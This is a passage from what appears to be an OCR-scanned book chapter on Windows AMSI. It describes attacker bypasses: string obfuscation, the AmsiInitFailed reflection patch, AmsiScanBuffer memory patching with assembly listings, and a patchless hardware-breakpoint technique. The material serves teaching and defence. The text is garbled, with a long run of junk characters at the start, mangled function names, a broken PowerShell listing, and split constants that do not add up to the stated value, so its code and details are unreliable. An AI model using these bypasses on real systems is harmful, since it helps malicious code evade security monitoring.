´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´
```

Listing 10-23: An example of string obfuscation in PowerShell that evades AMSI

AMSI typically flags the string AmIscanBuffer, a common component of patching-based evasions, as malicious, but here you can see that string concatenation allows us to bypass detection. AMSI implementations often receive obfuscated code, which they pass off to providers to determine if it is malicious. This means the provider must handle language-emulation functions such as string concatenation, decoding, and decrypting. However, many providers, including Microsoft, fail to detect even trivial bypasses such as the one shown here.

## AMSI Patching

Because AMSI and its associated providers get mapped into the attacker's process, the attacker has control over this memory. By patching critical values or functions inside amsi.dll , they can prevent AMSI from functioning inside their process. This evasion technique is extremely potent and has been the go-to choice for many red teams since around 2016, when Matt Graeber discussed using reflection inside PowerShell to patch amsi!InitFailed to true. His code, included in Listing 10-24, fit into a single tweet.

```bash
PS > [Ref].Assembly.GetType("System.Management.Automation.AnnStdUtils".
">  "GetField(AnnInvalidFailed", "NonPublic",Static,"SetValue($null,$true)
```

Listing 10-24: A simple AmsiInitFailed patch

Antimalware Scan Interface 197

---

When it comes to patching, attackers commonly target AmsiScanBuffer(), the function responsible for passing buffer contents to the providers. Daniel Duggan describes this technique in a blog post, "Memory Patching AMSI Bypass," where he outlines the steps an attacker's code must take before performing any truly malicious activity:

- 1. Retrieve the address of AmsiScanBuffer() within the amsi.dll currently
     loaded into the process.

2. Use kernel32jVirtualProtect() to change the memory protections to
   read-write, which allows the attacker to place the patch.

3. Copy the patch into the entry point of the AmsiScanBuffer() function.
4. Use kernel32jVirtualProtect() once again to revert the memory protec-
   tion back to read-execute.
   The patch itself takes advantage of the fact that, internally, AmsiScanBuffer() returns E_INVALIDARG if its initial checks fail. These checks include attempts to validate the address of the buffer to be scanned. Duggan's code adds a byte array that represents the assembly code in Listing 10-25. After this patch, when AmsiScanBuffer() is executed, it will immediately return this error code because the actual instruction that made up the original function of the has been overwritten.

```bash
mov eax, 0x80070057 ; E_INVALIDARG
ret
```

Listing 10-25: Error code returned to the caller of AmsiScanBuffer() after the patch

There are many variations of this technique, all of which work very similarly. For example, an attacker may patch AmsIOpenSession() instead of AmsIOscanBuffer(). They may also opt to corrupt one of the parameters passed into AmsIOscanBuffer(), such as the buffer length or the context, causing AMSI to return E_INVALID on its own.

Microsoft got wise to this evasion technique pretty quickly and took measures to defend against the bypass. One of the detections it implemented is based on the sequence of opcodes that make up the patch we've described. However, attackers can work around these detections in many ways. For example, they can simply modify their assembly code to achieve the same result, moving 0x80070057 into 0x8 and returning, in a way that is less direct. Consider the example in Listing 10-26, which breaks up the value 0x80070057 instead of moving it into the register all at once.

```bash
xor eax, eax ; Zero out EAX
add eax, 0x7459104a
add eax, 0x8adf00d
ret
```

Listing 10-26: Breaking up hardcoded values to evade patch detection

198 Chapter 10

---

Imagine that the EDR looks for the value 0x80070057 being moved into the 64X register. This evasion strategy would bypass its detection logic because the value is never directly referenced. Instead, it is broken up into two values, which happen to add up to the required value.

### A Patchless AMSI Bypass

In April 2022, Ceri Coburn unveiled a technique for bypassing AMSI without patching ansi.dll , an activity many EDR vendors have begun to monitor. Coburn's technique doesn't require fork&Rrun either, allowing the attacker to stay in their original process.

The technique is quite clever. First, the attacker obtains a function

pointer to @msi1@msicanBuffer() either from the loaded @msi.dll or by forcing

it to load into the process through a call to LoadLibrary(). Next, they register

a vectored exception handler via kernel32AddVectoredExceptionHandle(). This

handler allows developers to register a function that monitors and manages

all exceptions in the application. Finally, they set a hardware breakpoint on

the address of @msi1@msicanBuffer() by modifying the current thread's debug reg isters (DR0, DR6, and DR7).

When the attacker executes their .NET code inline, the system will eventually call WinSMCanBuffer(), triggering the hardware breakpoint and invoking the vectored exception handler. This function takes the current thread context and updates the registers to match the values set when AMSI doesn't detect malicious content, namely a return value of 0 (5-0K) in RAX and a result of 0 (AMSI_RESULT_CLEAN) in RSP+48.

Additionally, it pulls the return address from the stack (RSP) and points the instruction pointer (RIP) back to the caller of the AmiScanBuffer() function. Next, it walks the stack pointer back to its position from before the call to AmiScanBuffer(), clears the hardware breakpoint, and returns the EXCEPTION_CONTINUE_EXECUTION code. Execution resumes at the point at which the breakpoint occurred. Now Windows will take the attacker's modified thread context and continue execution with our changes in place, passing the falsified values back to the caller and letting the malicious code continue undetected.

## Conclusion

AMSI is an incredibly important piece of the host-based detection puzzle. Its integration into software such as PowerShell, .NET, and Microsoft Office means that it sits inline of many adversary activities, from initial access through post-exploitation. AMSI has been heavily researched due to its tremendous impact on offensive operations at the time of its release. Today, AMSI fills more of a supplementary role, as nearly countless evasion strategies exist for it. However, vendors have caught on to this and have begun to invest in monitoring for common AMSI evasion strategies, then using those as indicators of adversary activity themselves.

---

---
